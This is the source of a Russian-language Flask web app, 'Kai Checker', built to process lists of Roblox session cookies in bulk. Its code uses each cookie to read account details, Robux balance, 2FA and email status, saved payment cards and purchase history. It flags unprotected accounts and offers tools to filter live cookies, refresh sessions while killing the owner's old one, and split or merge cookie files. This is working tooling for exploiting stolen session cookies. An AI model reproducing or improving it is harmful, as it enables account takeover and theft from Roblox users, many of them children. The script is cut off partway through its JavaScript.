import os
import time
import logging
import re
import urllib3
import html
import sys
import asyncio
import zipfile
from datetime import datetime, timezone, timedelta
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO
from curl_cffi.requests import AsyncSession

# ===== НАСТРОЙКИ =====
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CURRENT_UPLOADED_FILE = None

# ============================================================
# ПОЛНЫЙ ЧЕКЕР ИНФОРМАЦИИ
# ============================================================

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'TotalRAP': 0, 'Created': '?', 'Country': '?',
        'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False,
        'SecurityStatus': '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)',
        'Cookie': cookie,
        'PurchasedGamepasses': {},
        'RareItems': [],
        'CreditCardsCount': 0,
        'IsPremium': False,
        'DonationTotal': 0
    }
    try:
        cleaned_cookie = cookie.strip()
        if ".ROBLOSECURITY=" in cleaned_cookie:
            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]

        import requests
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        })
        
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                info['UserID'] = d.get('id')
                info['Username'] = d.get('name')
                info['status'] = '✅'
            else:
                info['status'] = '❌'
                return info
        else:
            info['status'] = '❌'
            return info
            
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            security = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = security.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = security.get('IsPhoneSet', False)
            billing = d.get('BillingModel', {})
            info['CreditCardsCount'] = len(billing.get('SavedPaymentMethods', []))

        prem = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if prem and prem.get('isSubscribed', False):
            info['IsPremium'] = True

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            total_donated = 0
            
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    price = abs(item.get('currency', {}).get('amount', 0))
                    total_donated += price
                    item_type = str(details.get('type', ''))
                    if price >= 50 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {})
                        place_name = place_info.get('name', 'Другие игры')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            
            info['PurchasedGamepasses'] = gamepasses_dict
            info['DonationTotal'] = total_donated
        except Exception as e:
            logger.error(f"Gamepass error: {e}")

        security_score = 0
        if info.get('EmailSet'): security_score += 1
        if info.get('TwoFactorEnabled'): security_score += 2
        if info.get('AccountPinEnabled'): security_score += 1
        if info.get('PhoneSet'): security_score += 1

        if security_score >= 4:
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
        elif security_score >= 2:
            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
        else:
            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
    except Exception as e:
        logger.error(f"Err: {e}")
        info['status'] = '❌'
    return info

def format_short_report(info):
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    
    gp = info.get('PurchasedGamepasses', {})
    total_gp_robux = sum(p['price'] for passes in gp.values() for p in passes)
    
    r = f"📋 Аккаунт: {info['Username']} [{info['UserID']}]\n"
    r += f"🟢 VALID | 🆔 {info['UserID']}\n"
    r += f"📅 {info['Created']} | 🌍 {info['Country']} | {'✅ Premium' if info['IsPremium'] else '❌ Premium'}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"💎 RAP: {'❌ Нет' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}\n"
    r += f"🛡️ БЕЗОПАСНОСТЬ: Почта: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'} | {info['SecurityStatus']}\n"
    
    if gp:
        r += f"📦 ГЕЙМПАССЫ ({total_gp_robux:,} R$):\n"
        for game, passes in list(gp.items())[:3]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:6]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
    else:
        r += "📦 ГЕЙМПАССЫ: ❌ Нет\n"
    
    r += f"\n🍪 COOKIE:\n{info['Cookie']}"
    return r

def generate_full_txt_report(info):
    if info['status'] != '✅':
        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
    
    gp = info.get('PurchasedGamepasses', {})
    
    r = "╔══════════════════════════════════════════════════════════╗\n"
    r += "║  🎮 ROBLOX COOKIE CHECK REPORT                           ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 {info['Username']}                                   ║\n"
    r += f"║  🟢 ✅ | 🆔 {info['UserID']}                            ║\n"
    r += f"║  📅 {info['Created']} | 🌍 {info['Country']}             ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info['Robux']:,}                           ║\n"
    r += f"║  💸 Донат: ⏣ {info['DonationTotal']:,}                   ║\n"
    r += f"║  💎 RAP: {'❌ No' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}                           ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📧 Почта: {'Да' if info['EmailSet'] else 'Нет'} | 🔐 2FA: {'Да' if info['TwoFactorEnabled'] else 'Нет'}      ║\n"
    r += f"║  ⭐ Premium: {'Да' if info['IsPremium'] else 'Нет'} | 💳 Карты: {info['CreditCardsCount']}          ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🔫 ГЕЙМПАССЫ ПО ИГРАМ                                   ║\n"
    
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (Total: {game_total:,} R$):           ║\n"
            for p in passes:
                r += f"║    └ {p['name']} ({p['price']} R$)               ║\n"
    else:
        r += "║  🎮 ГЕЙМПАССЫ: ❌ Нет                                    ║\n"
        
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🍪 COOKIE:                                              ║\n"
    r += "╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"{info['Cookie']}\n\n"
    r += f"Generated: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
    return r

# ============================================================
# ВЕБ-СЕРВЕР И ИНТЕРФЕЙС
# ============================================================

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,600;0,700;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            padding: 24px;
            background: #0b081a;
            background-image: radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
            color: #ffffff;
        }
        .kai-wrapper {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
            background: rgba(18, 10, 40, 0.95);
            border: 2px solid #6c5ce7;
            border-radius: 32px;
            box-shadow: 0 0 60px rgba(108, 92, 231, 0.25);
        }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0d0722; border-radius: 8px; }
        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 8px; }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 0 16px; border-bottom: 1px solid #2a1a50;
            margin-bottom: 30px;
        }
        .logo {
            font-family: 'Poppins', sans-serif;
            font-size: 34px; font-weight: 900; font-style: italic;
            background: linear-gradient(135deg, #c084fc, #f472b6);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .tabs {
            display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 28px;
        }
        .tab {
            padding: 10px 24px; background: rgba(26, 16, 64, 0.9);
            border: 1px solid #2a1a50; border-radius: 40px; color: #9880c0;
            cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.25s;
            user-select: none;
        }
        .tab:hover { border-color: #a855f7; color: #fff; transform: translateY(-2px); }
        .tab.active {
            border-color: #c084fc; background: rgba(168, 85, 247, 0.3);
            color: #c084fc; box-shadow: 0 0 20px rgba(168,85,247,0.2);
        }

        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeUp 0.3s ease; }
        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(12px); } 100% { opacity: 1; transform: translateY(0); } }

        .card {
            background: rgba(18, 10, 40, 0.9);
            border: 1px solid #2a1a50; border-radius: 20px; padding: 28px 30px;
            margin-bottom: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }
        .card h2 {
            font-family: 'Poppins', sans-serif; font-weight: 700; font-style: italic;
            font-size: 20px; color: #d4c0ff; margin-bottom: 18px; display: flex; align-items: center; gap: 10px;
        }

        .btn {
            padding: 12px 28px; border: none; border-radius: 40px; font-size: 14px; font-weight: 700;
            cursor: pointer; transition: all 0.25s; display: inline-flex; align-items: center; gap: 10px;
            text-decoration: none;
        }
        .btn-primary {
            background: linear-gradient(135deg, #a855f7, #d946ef); color: #fff;
            box-shadow: 0 8px 24px rgba(168,85,247,0.25);
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(168,85,247,0.4); color: #fff; }
        .btn-secondary { background: rgba(255,255,255,0.06); border: 1px solid #2a1a50; color: #d4c0ff; }
        .btn-secondary:hover { background: rgba(255,255,255,0.1); }

        .toggle-group {
            display: flex;
            background: #0d0722;
            border: 1px solid #2a1a50;
            border-radius: 16px;
            padding: 4px;
            gap: 4px;
            margin-bottom: 18px;
        }
        .toggle-btn {
            flex: 1;
            padding: 12px 16px;
            background: transparent;
            border: none;
            border-radius: 12px;
            color: #9880c0;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
            text-align: center;
        }
        .toggle-btn.active {
            background: linear-gradient(135deg, rgba(168,85,247,0.3), rgba(217,70,239,0.3));
            color: #c084fc;
            border: 1px solid rgba(192,132,252,0.4);
            box-shadow: 0 4px 15px rgba(168,85,247,0.2);
        }

        textarea, .upload-area {
            width: 100%; padding: 14px 16px; background: #0d0722; border: 1px solid #2a1a50;
            border-radius: 14px; color: #ffffff; font-family: 'Inter', monospace; font-size: 14px;
            resize: vertical; transition: 0.2s;
        }
        textarea:focus, .upload-area:focus-within {
            border-color: #a855f7; outline: none; box-shadow: 0 0 0 3px rgba(168,85,247,0.2);
        }
        .upload-area {
            min-height: 100px; display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; border-style: dashed; gap: 6px; text-align: center; color: #ffffff;
        }

        .result-box {
            background: #0d0722; border: 1px solid #2a1a50; border-radius: 16px; padding: 18px;
            margin-top: 20px; max-height: 500px; overflow-y: auto; overflow-x: auto;
            font-family: 'Inter', monospace; font-size: 13px; color: #ffffff; white-space: pre-wrap; word-break: break-word;
        }

        .progress-bar {
            margin-top: 12px; background: #0d0722; border-radius: 40px; height: 6px; overflow: hidden; border: 1px solid #1a1040;
        }
        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #a855f7, #ec4899); transition: width 0.3s ease; }

        .footer { text-align: center; padding: 30px 0 12px; color: #4a3a6a; font-size: 13px; border-top: 1px solid #1a1040; margin-top: 30px; }
        .hidden-input { display: none !important; }
        .tool-section {
            margin-bottom: 20px; padding: 16px; background: rgba(13,7,34,0.5); border-radius: 14px; border: 1px solid #2a1a50;
        }
        .tool-section h3 {
            color: #d4c0ff; font-size: 16px; margin-bottom: 12px;
        }
    </style>
</head>
<body>

<div class="kai-wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div style="display: flex; align-items: center; gap: 15px;">
            <span id="sessionTimer" style="color: #00b894; font-family: 'Inter', monospace; font-weight: 600; font-size: 13px; background: rgba(0, 184, 148, 0.1); padding: 4px 10px; border-radius: 12px; border: 1px solid rgba(0, 184, 148, 0.2);">⏱️ 00:00:00</span>
            <div style="color:#4a3a6a; font-size:14px;">⚡ PRO</div>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="validator">✅ Валидатор</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <!-- ===== ЧЕКЕР ===== -->
    <div class="tab-content active" id="tab-checker">
        <div class="card">
            <h2>🔍 Проверка куков (Массовая)</h2>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="manualCookies" placeholder="Вставь куки сюда (каждый с новой строки) или загрузите txt файл справа..." rows="6"></textarea>
                    <div id="fileStatusInfo" style="margin-top:8px;color:#00b894;font-size:13px;"></div>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" id="fullArea">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                        <p style="font-size:12px; color:#9880c0;">Файл сохранится на сервере</p>
                    </div>
                    <input type="file" id="fullFile" accept=".txt" class="hidden-input">
                </div>
            </div>
            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                <button class="btn btn-primary" id="btnRunChecker">🚀 Запустить проверку</button>
                <button class="btn btn-secondary" id="btnClearChecker">🧹 Очистить</button>
            </div>
            <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
            <div class="result-box" id="fullcheckResult">Результаты появятся здесь...</div>
        </div>
    </div>

    <!-- ===== ВАЛИДАТОР ===== -->
    <div class="tab-content" id="tab-validator">
        <div class="card">
            <h2>✅ Валидатор (отсев мёртвых)</h2>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="validatorCookies" placeholder="Вставьте куки для валидации..." rows="6"></textarea>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" id="validatorArea">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                    </div>
                    <input type="file" id="validatorFile" accept=".txt" class="hidden-input">
                </div>
            </div>
            <button class="btn btn-primary" id="btnRunValidator" style="margin-top:14px;">🧪 Запустить</button>
            <div class="result-box" id="validatorResult">Здесь будет результат валидации...</div>
        </div>
    </div>

    <!-- ===== ФРЕШЕР ===== -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <div style="margin-bottom: 8px;">
                <label style="color: #d4c0ff; font-size: 14px; font-weight: 600; display: block; margin-bottom: 8px;">Режим обновления сессий:</label>
                <div class="toggle-group">
                    <button type="button" class="toggle-btn active" id="modeDuplicate">♻️ Дублировать кук</button>
                    <button type="button" class="toggle-btn" id="modeKill">💀 Убить старый кук</button>
                </div>
                <input type="hidden" id="fresherMode" value="duplicate">
            </div>
            <div style="display:flex; flex-wrap:wrap; gap:18px;">
                <div style="flex:2;">
                    <textarea id="fresherCookies" placeholder="Вставьте куки для обновления..." rows="6"></textarea>
                </div>
                <div style="flex:1;">
                    <div class="upload-area" id="fresherArea">
                        <p>📁 <strong>Загрузить .txt</strong></p>
                    </div>
                    <input type="file" id="fresherFile" accept=".txt" class="hidden-input">
                </div>
            </div>
            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                <button class="btn btn-primary" id="btnRunFresher">⚡ Обновить сессии</button>
                <button class="btn btn-secondary" id="btnClearFresher">🧹 Очистить</button>
            </div>
            <div class="result-box" id="fresherResult">Результаты фрешера появятся здесь...</div>
        </div>
    </div>

    <!-- ===== ИНСТРУМЕНТЫ ===== -->
    <div class="tab-content" id="tab-tools">
        <div class="card">
            <h2>📦 Инструменты обработки</h2>
            <p style="color: #9880c0; font-size: 14px; margin-bottom: 16px;">Сортировка, разделение и слияние файлов с куками.</p>
            
            <!-- Сортер -->
            <div class="tool-section">
                <h3>📂 Сортер (по одному в файл)</h3>
                <div style="display:flex; flex-wrap:wrap; gap:18px;">
                    <div style="flex:2;">
                        <textarea id="sorterInput" placeholder="Вставьте куки для сортировки..." rows="4"></textarea>
                    </div>
                    <div style="flex:1;">
                        <div class="upload-area" id="sorterArea">
                            <p>📁 <strong>Загрузить .txt</strong></p>
                        </div>
                        <input type="file" id="sorterFile" accept=".txt" class="hidden-input">
                    </div>
                </div>
                <button class="btn btn-primary" id="btnRunSorter" style="margin-top:12px;">📦 Сортировать</button>
                <div class="result-box" id="sorterResult">Результат сортировки...</div>
            </div>
            
            <!-- Разделитель -->
            <div class="tool-section">
                <h3>✂️ Разделитель (на 5 частей)</h3>
                <div style="display:flex; flex-wrap:wrap; gap:18px;">
                    <div style="flex:2;">
                        <textarea id="splitInput" placeholder="Вставьте куки для разделения..." rows="4"></textarea>
                    </div>
                    <div style="flex:1;">
                        <div class="upload-area" id="splitArea">
                            <p>📁 <strong>Загрузить .txt</strong></p>
                        </div>
                        <input type="file" id="splitFile" accept=".txt" class="hidden-input">
                    </div>
                </div>
                <button class="btn btn-primary" id="btnRunSplit" style="margin-top:12px;">✂️ Разделить</button>
                <div class="result-box" id="splitResult">Результат разделения...</div>
            </div>
            
            <!-- Слияние -->
            <div class="tool-section">
                <h3>🔗 Слияние (удаление дублей)</h3>
                <div style="display:flex; flex-wrap:wrap; gap:18px;">
                    <div style="flex:2;">
                        <textarea id="mergeInput" placeholder="Вставьте куки для слияния..." rows="4"></textarea>
                    </div>
                    <div style="flex:1;">
                        <div class="upload-area" id="mergeArea">
                            <p>📁 <strong>Загрузить несколько .txt</strong></p>
                        </div>
                        <input type="file" id="mergeFile" accept=".txt" multiple class="hidden-input">
                    </div>
                </div>
                <button class="btn btn-primary" id="btnRunMerge" style="margin-top:12px;">🔗 Слить</button>
                <div class="result-box" id="mergeResult">Результат слияния...</div>
            </div>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO</div>
</div>

<script>
    // ===== ТАЙМЕР =====
    var startTime = Date.now();
    setInterval(function() {
        var diff = Math.floor((Date.now() - startTime) / 1000);
        var h = String(Math.floor(diff / 3600)).padStart(2, '0');
        var m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
        var s = String(diff % 60).padStart(2, '0');
        var timerEl = document.getElementById('sessionTimer');
        if (timerEl) timerEl.textContent = '⏱️ ' + h + ':' + m + ':' + s;
    }, 1000);

    // ===== ВКЛАДКИ =====
    document.querySelectorAll('.tab').forEach(function(tab) {
        tab.addEventListener('click', function() {
            var tabId = this.getAttribute('data-tab');
            if (!tabId) return;
            document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
            document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
            this.classList.add('active');
            var target = document.getElementById('tab-' + tabId);
            if (target) target.classList.add('active');
        });
    });

    // ===== РЕЖИМЫ ФРЕШЕРА =====
    document.getElementById('modeDuplicate').addEventListener('click', function() {
        document.getElementById('fresherMode').value = 'duplicate';
        this.classList.add('active');
        document.getElementById('modeKill').classList.remove('active');
    });
    document.getElementById('modeKill').addEventListener('click', function() {
        document.getElementById('fresherMode').value = 'kill';
        this.classList.add('active');
        document.getElementById('modeDuplicate').classList.remove('active');
    });

    // ===== ЗАГРУЗКА ФАЙЛОВ =====
    function setupFileInput(inputId, textareaId) {
        var input = document.getElementById(inputId);
        if (!input) return;
        input.addEventListener('change', function() {
            if (this.files && this.files[0]) {
                var reader = new FileReader();
                reader.onload = function(evt) {
                    var textarea = document.getElementById(textareaId);
                    if (textarea) textarea.value = evt.target.result;
                };
                reader.readAsText(this.files[0]);
            }
        });
    }

    // Привязываем загрузку файлов к текстовым полям
    setupFileInput('fullFile', 'manualCookies');
    setupFileInput('validatorFile', 'validatorCookies');
    setupFileInput('fresherFile', 'fresherCookies');
    setupFileInput('sorterFile', 'sorterInput');
    setupFileInput('splitFile', 'splitInput');

    // Множественная загрузка для слияния
    var mergeFileInput = document.getElementById('mergeFile');
    if (mergeFileInput) {
        mergeFileInput.addEventListener('change', function() {
            if (this.files && this.files.length > 0) {
                var combined = '';
                var count = 0;
                Array.from(this.files).forEach(function(file) {
                    var reader = new FileReader();
                    reader.onload = function(evt) {
                        combined += evt.target.result + '\n';
                        count++;
                        if (count === mergeFileInput.files.length) {
                            document.getElementById('mergeInput').value = combined;
                        }
                    };
                    reader.readAsText(file);
                });
            }
        });
    }

    // ============================================================
    // ===== ЧЕКЕР ================================================
    // ============================================================
    var checkerHistory = [];

    document.getElementById('btnRunChecker').addEventListener('click', function() {
        var resBox = document.getElementById('fullcheckResult');
        var manual = document.getElementById('manualCookies').value.trim();
        var progress = document.getElementById('checkerProgress');
        
        if (!manual) {
            resBox.textContent = '❌ Вставь куки или загрузи .txt!';
            return;
        }

        var formData = new FormData();
        formData.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');

        resBox.textContent = '⏳ Проверка аккаунтов запущена...';
        progress.style.width = '40%';
        
        fetch('/api/fullcheck', { method: 'POST', body: formData })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                progress.style.width = '100%';
                setTimeout(function() { progress.style.width = '0%'; }, 1000);
                
                if (data.success) {
                    if (data.reports && data.reports.length) {
                        for (var i = 0; i < data.reports.length; i++) {
                            checkerHistory.push(data.reports[i]);
                        }
                    }
                    
                    var html = '✅ Проверено аккаунтов: ' + data.total + ' | Успешно валидных: ' + data.valid_count + '\n\n';
                    for (var j = 0; j < checkerHistory.length; j++) {
                        html += checkerHistory[j] + '\n────────────────────────────────────────\n';
                    }
                    if (data.download_url) {
                        html += '\n📥 <a href="' + data.download_url + '" class="btn btn-primary" target="_blank" style="margin-top:10px; display:inline-block;">Скачать ZIP со всеми отчетами (.txt)</a>';
                    }
                    resBox.innerHTML = html;
                    resBox.scrollTop = resBox.scrollHeight;
                } else {
                    resBox.textContent = '❌ ' + (data.message || 'Ошибка');
                }
            })
            .catch(function(e) {
                resBox.textContent = '❌ Ошибка: ' + e.message;
                progress.style.width = '0%';
            });
    });

    document.getElementById('btnClearChecker').addEventListener('click', function() {
        document.getElementById('manualCookies').value = '';
        document.getElementById('fileStatusInfo').textContent = '';
        checkerHistory = [];
        document.getElementById('fullcheckResult').textContent = 'Результаты появятся здесь...';
    });

    // ============================================================
    // ===== ВАЛИДАТОР ============================================
    // ============================================================
    document.getElementById('btnRunValidator').addEventListener('click', function() {
        var resBox = document.getElementById('validatorResult');
        var cookies = document.getElementById('validatorCookies').value.trim();
        if (!cookies) {
            resBox.textContent = '❌ Вставьте куки для валидации!';
            return;
        }
        resBox.textContent = '⏳ Выполняется быстрая валидация...';
        fetch('/api/validator', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: cookies })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success) {
                var html = '✅ Проверено: ' + data.total + ' | Живых (Valid): ' + data.valid_count + ' | Мертвых (Dead): ' + data.dead_count + '\n\n';
                html += '🟢 ЖИВЫЕ КУКИ:\n' + (data.valid_list.length ? data.valid_list.join('\n') : 'Нет живых') + '\n\n';
                html += '❌ МЕРТВЫЕ КУКИ:\n' + (data.dead_list.length ? data.dead_list.join('\n') : 'Нет мертвых');
                resBox.textContent = html;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Ошибка валидации');
            }
        })
        .catch(function(e) {
            resBox.textContent = '❌ Ошибка сети: ' + e.message;
        });
    });

    // ============================================================
    // ===== ФРЕШЕР ===============================================
    // ============================================================
    var fresherHistory = [];

    document.getElementById('btnRunFresher').addEventListener('click', function() {
        var resBox = document.getElementById('fresherResult');
        var cookies = document.getElementById('fresherCookies').value.trim();
        var mode = document.getElementById('fresherMode').value;
        if (!cookies) {
            resBox.textContent = '❌ Вставьте куки для фреша!';
            return;
        }
        resBox.textContent = '⏳ Выполняется обновление сессий...';
        fetch('/api/fresher', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: cookies, mode: mode })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success) {
                if (data.refreshed_list && data.refreshed_list.length) {
                    for (var i = 0; i < data.refreshed_list.length; i++) {
                        fresherHistory.push(data.refreshed_list[i]);
                    }
                }
                var html = '✅ Успешно обновлено сессий (режим: ' + (mode === 'kill' ? 'Убийство старого кука' : 'Дублирование') + '): ' + data.refreshed_count + '\n\n';
                for (var j = 0; j < fresherHistory.length; j++) {
                    html += fresherHistory[j] + '\n────────────────────────────────────────\n';
                }
                resBox.textContent = html;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Ошибка фрешера');
            }
        })
        .catch(function(e) {
            resBox.textContent = '❌ Ошибка сети: ' + e.message;
        });
    });

    document.getElementById('btnClearFresher').addEventListener('click', function() {
        document.getElementById('fresherCookies').value = '';
        document.getElementById('fresherResult').textContent = 'Результаты фрешера появятся здесь...';
        fresherHistory = [];
    });

    // ============================================================
    // ===== ИНСТРУМЕНТЫ ==========================================
    // ============================================================
    
    // Сортер
    document.getElementById('btnRunSorter').addEventListener('click', function() {
        var resBox = document.getElementById('sorterResult');
        var input = document.getElementById('sorterInput').value.trim();
        if (!input) {
            resBox.textContent = '❌ Вставьте куки для сортировки!';
            return;
        }
        resBox.textContent = '⏳ Сортировка...';
        fetch('/api/sorter', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: input })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success) {
                var html = '✅ Сортировка завершена!\n📦 Куков: ' + data.total + '\n';
                if (data.download_url) {
                    html += '\n📥 <a href="' + data.download_url + '" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>';
                }
                resBox.innerHTML = html;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Ошибка');
            }
        })
        .catch(function(e) {
            resBox.textContent = '❌ Ошибка: ' + e.message;
        });
    });

    // Разделитель
    document.getElementById('btnRunSplit').addEventListener('click', function() {
        var resBox = document.getElementById('splitResult');
        var input = document.getElementById('splitInput').value.trim();
        if (!input) {
            resBox.textContent = '❌ Вставьте куки для разделения!';
            return;
        }
        resBox.textContent = '⏳ Разделение на 5 частей...';
        fetch('/api/split', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: input })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success) {
                var html = '✅ Разделение завершено!\n📦 Куков: ' + data.total + '\n';
                if (data.download_url) {
                    html += '\n📥 <a href="' + data.download_url + '" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>';
                }
                resBox.innerHTML = html;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Ошибка');
            }
        })
        .catch(function(e) {
            resBox.textContent = '❌ Ошибка: ' + e.message;
        });
    });

    // Слияние
    document.getElementById('btnRunMerge').addEventListener('click', function() {
        var resBox = document.getElementById('mergeResult');
        var input = document.getElementById('mergeInput').value.trim();
        if (!input) {
            resBox.textContent = '❌ Вставьте куки для слияния!';
            return;
        }
        resBox.textContent = '⏳ Слияние и удаление дублей...';
        fetch('/api/merge', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: input })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success) {
                var html = '✅ Слияние завершено!\n📦 Уникальных куков: ' + data.total + '\n🗑️ Дублей удалено: ' + data.duplicates + '\n';
                if (data.download_url) {
                    html += '\n📥 <a href="' + data.download_url + '" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать</a>';
                }
                resBox.innerHTML = html;
            } else {
                resBox.textContent = '❌ ' + (data.message || 'Ошибка');
            }
        })
        .catch(function(e) {
            resBox.textContent = '❌ Ошибка: ' + e.message;
        });
    });

